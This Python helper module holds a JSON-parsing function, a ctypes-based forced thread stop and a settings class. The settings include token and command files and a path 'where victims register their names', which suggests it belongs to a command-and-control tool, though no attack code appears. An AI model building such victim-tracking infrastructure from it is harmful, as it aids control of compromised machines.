#%%
from functools import cached_property
import os
from json.decoder import JSONDecoder, WHITESPACE
from threading import Event
from clint.util import permanent as _perm
from logger import log
import ctypes


decoder=JSONDecoder()
_w=WHITESPACE.match
def str_to_json(s):
    ''' decode the first jsonable only. '''
    if not s:
        return s
    log.debug(f'formating obj --> "{s}" ')

    idx=_w(s, 0).end()
    if s[idx] not in '[{("':# for now numbers are not concedered
        return s# proably undumped str
    obj, end = decoder.raw_decode(s, idx=idx)
    
    end = _w(s, end).end()
    if end != len(s):
        log.debug(f'json loads until char: {end}')
    
    return obj

#%%
def force_stop(_thread):
    if not _thread.is_alive():
        return
    
    _id=_thread._ident# working on 3.9.1
    res = ctypes.pythonapi.PyThreadState_SetAsyncExc(_id,
              ctypes.py_object(SystemExit))
    if res > 1:
        ctypes.pythonapi.PyThreadState_SetAsyncExc(_id, 0)
        # log.info('Exception raise failure leads force_stop to fail')

#%%
class Values:
    def __init__(self):
        self.app_name="no port"
        self.safety_interval=5# minutes
        self.bucket_port=6000
        self.token_file="controll file/token.json"
        self.command_file="controll file/commands.json"
        self.vic_path="whoisactive"# where victims register their names
        self.backup_folder_name='old'

        self.last_time={"Dark":4} # {"user":int}
        self.listen_for=[]
        # self.last_all_time=0



#%%
class permanent(_perm):
    def __init__(self):
        self.data_dir=os.path.abspath("detail.bin")
        self.var = Values()
        self.write = Event()
        self.write.set()

        self.setup()

    @cached_property
    def default(self):
        value = Values().__dict__
        return value

data_store=permanent()


# %%
if __name__=="__main__":
    pass
